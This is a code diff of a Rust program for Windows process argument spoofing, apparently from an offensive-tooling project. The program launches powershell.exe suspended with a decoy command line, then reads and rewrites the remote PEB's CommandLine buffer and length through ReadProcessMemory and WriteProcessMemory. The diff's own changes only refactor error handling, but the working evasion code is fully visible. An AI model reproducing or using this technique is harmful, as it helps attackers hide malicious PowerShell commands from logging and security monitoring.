@@ -1,5 +1,5 @@
 use memoffset::offset_of;
-use std::{ffi::c_void, mem::size_of, process::exit};
+use std::{ffi::c_void, mem::size_of};
 use windows::core::{w, PWSTR};
 use windows::Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation};
 use windows::Win32::Foundation::{CloseHandle, HANDLE, UNICODE_STRING};
@@ -20,8 +20,7 @@ fn main() {
 
     unsafe {
         // Creating a process in suspended mode
-        let mut start_argument: Vec<u16> =
-            "powershell.exe args spoofing\0".encode_utf16().collect(); // Command that will perform spoofing
+        let mut start_argument: Vec<u16> = "powershell.exe args spoofing\0".encode_utf16().collect(); // Command that will perform spoofing
         startup_info.cb = size_of::<STARTUPINFOW>() as u32;
 
         let _process = CreateProcessW(
@@ -35,10 +34,8 @@ fn main() {
             w!("C:\\Windows\\System32\\"),
             &mut startup_info,
             &mut pi,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateProcessW Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateProcessW Failed With Error: {e}");
         });
 
         println!("[+] DONE!");
@@ -65,11 +62,9 @@ fn main() {
             &mut ppeb as *mut _ as *mut c_void,
             size_of::<PEB>(),
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] ReadProcessMemory (1) Failed With Error: {e}");
+        ).unwrap_or_else(|e| {
             clear(hprocess, hthread);
-            exit(-1);
+            panic!("[!] ReadProcessMemory (1) Failed With Error: {e}");
         });
 
         // Reading the RTL_USER_PROCESS_PARAMETERS structure from the remote process's PEB
@@ -79,11 +74,9 @@ fn main() {
             &mut p_params as *mut _ as *mut c_void,
             size_of::<RTL_USER_PROCESS_PARAMETERS>() + 255,
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] ReadProcessMemory (2) Failed With Error: {e}");
+        ).unwrap_or_else(|e| {
             clear(hprocess, hthread);
-            exit(-1);
+            panic!("[!] ReadProcessMemory (2) Failed With Error: {e}");
         });
 
         // Changing the Buffer value for the actual command
@@ -97,29 +90,23 @@ fn main() {
             reajust_argument.as_ptr() as _,
             reajust_argument.len() * size_of::<u16>() + 1,
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] WriteProcessMemory (1) Failed With Error: {e}");
+        ).unwrap_or_else(|e| {
             clear(hprocess, hthread);
-            exit(-1);
+            panic!("[!] WriteProcessMemory (1) Failed With Error: {e}");
         });
 
         // Changing the size of CommandLine.Length
         let new_len_power: usize = "powershell.exe\0".encode_utf16().count() * size_of::<u16>();
-        let offset = ppeb.ProcessParameters as usize
-            + offset_of!(RTL_USER_PROCESS_PARAMETERS, CommandLine)
-            + offset_of!(UNICODE_STRING, Length);
+        let offset = ppeb.ProcessParameters as usize + offset_of!(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offset_of!(UNICODE_STRING, Length);
         WriteProcessMemory(
             hprocess,
             offset as _,
             &new_len_power as *const _ as *const c_void,
             size_of::<u32>(),
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] WriteProcessMemory (2) Failed With Error: {e}");
+        ).unwrap_or_else(|e| {
             clear(hprocess, hthread);
-            exit(-1);
+            panic!("[!] WriteProcessMemory (2) Failed With Error: {e}");
         });
 
         println!("[+] Thread Executed!!");
